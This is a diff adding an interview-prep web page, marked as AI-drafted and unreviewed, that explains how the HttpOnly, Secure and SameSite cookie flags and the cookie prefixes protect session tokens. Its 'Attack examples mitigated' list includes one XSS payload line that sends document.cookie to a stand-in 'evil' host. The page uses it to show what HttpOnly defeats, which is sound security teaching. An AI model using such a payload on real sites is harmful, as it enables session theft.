@@ -1,0 +1,51 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Content-Security-Policy" content="default-src 'none'; style-src 'self'; img-src 'self' data:; base-uri 'none'; form-action 'none'">
+<title>How do cookie security flags (`HttpOnly`, `Secure`, `SameSite`) protect authentication tokens against theft? | InterviewGearUp</title>
+<meta name="description" content="HttpOnly hides a cookie from JavaScript, so XSS cannot read and exfiltrate a session token. Secure restricts it to HTTPS, blocking sniffing on plaintext…">
+<link rel="canonical" href="https://sadiqgpasha89.github.io/InterviewGearUp/q/sec-68.html">
+<meta property="og:title" content="How do cookie security flags (`HttpOnly`, `Secure`, `SameSite`) protect authentication tokens against theft? | InterviewGearUp">
+<meta property="og:description" content="HttpOnly hides a cookie from JavaScript, so XSS cannot read and exfiltrate a session token. Secure restricts it to HTTPS, blocking sniffing on plaintext…">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://sadiqgpasha89.github.io/InterviewGearUp/q/sec-68.html">
+<meta name="color-scheme" content="light dark">
+<link rel="icon" href="../favicon.svg" type="image/svg+xml">
+<link rel="stylesheet" href="../css/style.css">
+</head>
+<body>
+<a class="skip" href="#main">Skip to content</a>
+<header class="top"><div class="top-in"><a class="brand" href="../"><span>InterviewGearUp</span></a></div></header>
+<main id="main" class="static-page">
+<p class="muted small-text"><a href="index.html">All questions with written answers</a></p>
+<h1>How do cookie security flags (`HttpOnly`, `Secure`, `SameSite`) protect authentication tokens against theft?</h1>
+<p class="muted small-text meta-line">Security engineer · Gear 2 (Mid-level) · AppSec · Difficulty: medium · AI-drafted, not yet reviewed by a person</p>
+<div class="short"><h4>In 30 seconds</h4>
+<p>HttpOnly hides a cookie from JavaScript, so XSS cannot read and exfiltrate a session token. Secure restricts it to HTTPS, blocking sniffing on plaintext connections. SameSite limits cross-site sending, defeating most CSRF and some cross-site leaks. Combined with the __Host- prefix, tight Path and Domain, and short lifetimes, they harden authentication cookies considerably.</p></div>
+<h4>Explained in depth</h4>
+<h4>Why cookie attributes matter</h4>
+<p>Session cookies and tokens are bearer credentials: whoever holds them is the user. Attackers try to <strong>steal</strong> them (XSS, network sniffing, malware), <strong>fixate or overwrite</strong> them (subdomain or network injection), or <strong>abuse</strong> them from other sites (CSRF). Cookie attributes are cheap browser-enforced defences.</p>
+<h4>The flags</h4>
+<pre><code>Set-Cookie: __Host-session=9f3c...; Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=3600</code></pre>
+<ol start="1"><li><strong><code>HttpOnly</code></strong>: the browser does <strong>not expose</strong> the cookie to <code>document.cookie</code> or other JavaScript APIs; it is only sent in HTTP requests. If an XSS bug lets an attacker run script, they <strong>cannot read</strong> the session ID and send it to their server, which prevents persistent session theft and replay from elsewhere. Limits: XSS code can still <strong>perform actions as the user</strong> within the page (forge requests with the cookie attached automatically, read responses), so HttpOnly reduces but does not remove XSS impact. Fix XSS itself (encoding, CSP).</li><li><strong><code>Secure</code></strong>: the cookie is only sent over HTTPS (and, in modern browsers, can only be set from secure origins). It prevents leaking the cookie in cleartext on HTTP requests, such as when a user is downgraded or visits <code>http://</code> links on public Wi-Fi. Combine with <strong>HSTS</strong> so the browser never makes plaintext requests.</li><li><strong><code>SameSite</code></strong>: controls whether the cookie is sent on <strong>cross-site requests</strong>:</li></ol>
+<ul><li><strong><code>Strict</code></strong>: only sent when the request originates from the same site. Strongest CSRF protection; but clicking a link from an email to your site arrives without the cookie (user appears logged out until reload), which may hurt UX.</li><li><strong><code>Lax</code></strong> (default in modern browsers when unspecified): sent on same-site requests and on <strong>top-level navigations using safe methods</strong> (GET from a link click). Not sent on cross-site POST, iframe, fetch or image requests. Blocks classic CSRF form posts while keeping links working. Note: state-changing GET endpoints remain exposed.</li><li><strong><code>None; Secure</code></strong>: sent on all cross-site requests; required for third-party contexts (embedded widgets, SSO flows in iframes, cross-site APIs); then rely on <strong>CSRF tokens</strong>.</li></ul>
+<p>   &quot;Site&quot; means registrable domain (eTLD+1) plus scheme, so <code>a.example.com</code> and <code>b.example.com</code> are same-site.</p>
+<ol start="4"><li><strong><code>Domain</code> and <code>Path</code></strong>: omit <code>Domain</code> so the cookie is <strong>host-only</strong> (not shared with subdomains, which could be compromised or attacker-controlled through subdomain takeover). Set <code>Path=/</code> only when needed.</li><li><strong>Lifetime</strong>: use session cookies or short <code>Max-Age</code> for authentication, idle and absolute timeouts server-side, rotation after login and privilege change (prevent <strong>session fixation</strong>), invalidate on logout.</li><li><strong>Prefixes</strong>: <code>__Secure-</code> requires <code>Secure</code> and HTTPS origin. <strong><code>__Host-</code></strong> requires <code>Secure</code>, <strong>no <code>Domain</code> attribute, <code>Path=/</code></strong>, so the cookie cannot be overwritten by sibling subdomains or set from insecure origins, defending against <strong>cookie tossing and injection</strong>.</li><li><strong><code>Partitioned</code> (CHIPS)</strong> cookies for third-party contexts keyed by top-level site, supporting privacy-preserving embeds.</li></ol>
+<h4>Defence in depth</h4>
+<ul><li>Flags <strong>complement</strong> other controls: output encoding and <strong>CSP</strong> (stop XSS), CSRF tokens or <strong>double-submit</strong> patterns for state changing requests, <code>Origin</code> and <code>Referer</code> verification, <code>Sec-Fetch-Site</code> header checks, re-authentication for sensitive actions, <strong>token binding</strong> to client properties where possible (device-bound session credentials), and anomaly detection.</li><li>Avoid storing tokens in <code>localStorage</code> or <code>sessionStorage</code> (readable by any script); prefer HttpOnly cookies or a backend-for-frontend pattern for SPAs.</li><li>Do not put sensitive data (PII, roles) in cookies unless signed and encrypted (JWT in cookies must still be HttpOnly), keep cookie size small.</li></ul>
+<h4>Testing</h4>
+<p>Inspect headers in DevTools (Application panel shows flags), automated checks (OWASP ZAP and security scanners flag missing flags), integration tests asserting <code>Set-Cookie</code> attributes (<code>Secure</code>, <code>HttpOnly</code>, <code>SameSite</code>) for every auth cookie, and verify behaviour in cross-site test pages (does the cookie travel with cross-site POST?). Frameworks provide config: Express <code>cookie: { httpOnly: true, secure: true, sameSite: &#39;lax&#39; }</code>, Django <code>SESSION_COOKIE_SECURE</code>, Spring <code>server.servlet.session.cookie.*</code>.</p>
+<h4>Attack examples mitigated</h4>
+<ul><li>XSS payload <code>fetch(&#39;//evil/?c=&#39;+document.cookie)</code> returns nothing useful with HttpOnly.</li><li>Public Wi-Fi sniffing of <code>http://</code> images carrying cookies is prevented by Secure.</li><li>A malicious page autosubmitting a POST form to <code>bank.com/transfer</code> is blocked by SameSite Lax or Strict because the session cookie is not sent.</li></ul>
+<h4>Pitfalls</h4>
+<p>Assuming HttpOnly stops XSS, using <code>SameSite=None</code> without CSRF tokens, setting <code>Domain=.example.com</code> and exposing cookies to every subdomain, forgetting that Lax still permits state-changing GET requests, and leaving cookies without expiry or rotation.</p>
+<h4>Likely follow-ups</h4>
+<ul><li>Why does HttpOnly not prevent XSS attacks that act within the victim&#39;s browser session?</li><li>What is the difference between SameSite Strict, Lax and None, and how does Lax allow top-level navigations?</li><li>What do the __Host- and __Secure- cookie prefixes enforce?</li></ul>
+<p><a class="btn primary" href="../#/q/sec-68">Practise this question in the app</a></p>
+<p class="small-text"><a href="https://github.com/sadiqgpasha89/InterviewGearUp/issues/new?template=content-feedback.yml&amp;title=%5BAnswer+feedback%5D+sec-68%3A+How+do+cookie+security+flags+%28%60HttpOnly%60%2C+%60Secure%60%2C+%60SameSite%60%29%E2%80%A6&amp;question-id=sec-68&amp;context=Security+engineer%2C+Gear+2%2C+topic%3A+AppSec%2C+content+version+1.+Link%3A+https%3A%2F%2Fsadiqgpasha89.github.io%2FInterviewGearUp%2Fq%2Fsec-68.html" rel="noopener noreferrer">Report a problem with this answer</a></p>
+</main>
+<footer class="foot"><p>Answers are study aids written to explain the ideas, not scripts to memorise. Verify anything you rely on. <a href="../">Open the app</a> · <a href="https://github.com/sadiqgpasha89/InterviewGearUp" rel="noopener noreferrer">Source on GitHub</a></p></footer>
+</body>
+</html>
